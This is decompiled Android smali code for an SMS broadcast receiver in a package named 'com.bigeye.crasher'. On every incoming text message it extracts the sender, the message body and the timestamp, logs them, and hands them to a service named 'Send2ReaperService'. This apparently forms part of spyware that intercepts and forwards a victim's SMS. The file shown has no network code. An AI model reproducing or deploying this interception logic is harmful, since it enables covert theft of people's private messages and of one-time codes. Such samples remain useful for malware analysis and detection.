.class public Lcom/bigeye/crasher/IncomingSMSBroadcastReceiver;
.super Landroid/content/BroadcastReceiver;
.source "IncomingSMSBroadcastReceiver.java"


# instance fields
.field public APP_TAG:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 32
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 34
    const-string v0, "IncomingSMSBroadcastReceiver"

    iput-object v0, p0, Lcom/bigeye/crasher/IncomingSMSBroadcastReceiver;->APP_TAG:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 10
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 39
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    .line 40
    .local v1, "bundle":Landroid/os/Bundle;
    const/4 v3, 0x0

    .line 41
    .local v3, "msgs":[Landroid/telephony/gsm/SmsMessage;
    const-string v5, "SMS from: "

    .line 43
    .local v5, "smsContent":Ljava/lang/String;
    if-eqz v1, :cond_2

    .line 45
    const-string v7, "pdus"

    invoke-virtual {v1, v7}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, [Ljava/lang/Object;

    move-object v4, v7

    check-cast v4, [Ljava/lang/Object;

    .line 46
    .local v4, "pdus":[Ljava/lang/Object;
    array-length v7, v4

    new-array v3, v7, [Landroid/telephony/gsm/SmsMessage;

    .line 47
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_0
    array-length v7, v3

    if-ge v2, v7, :cond_1

    .line 48
    aget-object v7, v4, v2

    check-cast v7, [B

    check-cast v7, [B

    invoke-static {v7}, Landroid/telephony/gsm/SmsMessage;->createFromPdu([B)Landroid/telephony/gsm/SmsMessage;

    move-result-object v7

    aput-object v7, v3, v2

    .line 49
    if-nez v2, :cond_0

    .line 51
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    aget-object v8, v3, v2

    invoke-virtual {v8}, Landroid/telephony/gsm/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 52
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, ": "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 55
    :cond_0
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    aget-object v8, v3, v2

    invoke-virtual {v8}, Landroid/telephony/gsm/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 59
    new-instance v7, Landroid/text/format/DateFormat;

    invoke-direct {v7}, Landroid/text/format/DateFormat;-><init>()V

    const-string v7, "dd-MMM-yyyy k:m:s"

    aget-object v8, v3, v2

    invoke-virtual {v8}, Landroid/telephony/gsm/SmsMessage;->getTimestampMillis()J

    move-result-wide v8

    invoke-static {v7, v8, v9}, Landroid/text/format/DateFormat;->format(Ljava/lang/CharSequence;J)Ljava/lang/CharSequence;

    move-result-object v7

    invoke-interface {v7}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v6

    .line 60
    .local v6, "tmp_dt":Ljava/lang/String;
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, ": "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 47
    add-int/lit8 v2, v2, 0x1

    goto/16 :goto_0

    .line 65
    .end local v6    # "tmp_dt":Ljava/lang/String;
    :cond_1
    iget-object v7, p0, Lcom/bigeye/crasher/IncomingSMSBroadcastReceiver;->APP_TAG:Ljava/lang/String;

    invoke-static {v7, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 67
    new-instance v0, Landroid/content/Intent;

    const-class v7, Lcom/bigeye/crasher/Send2ReaperService;

    invoke-direct {v0, p1, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 68
    .local v0, "SvcIntent":Landroid/content/Intent;
    const-string v7, "OPERATION"

    const-string v8, "INCOMING"

    invoke-virtual {v0, v7, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 69
    const-string v7, "MSG"

    invoke-virtual {v0, v7, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 70
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 72
    .end local v0    # "SvcIntent":Landroid/content/Intent;
    .end local v2    # "i":I
    .end local v4    # "pdus":[Ljava/lang/Object;
    :cond_2
    return-void
.end method
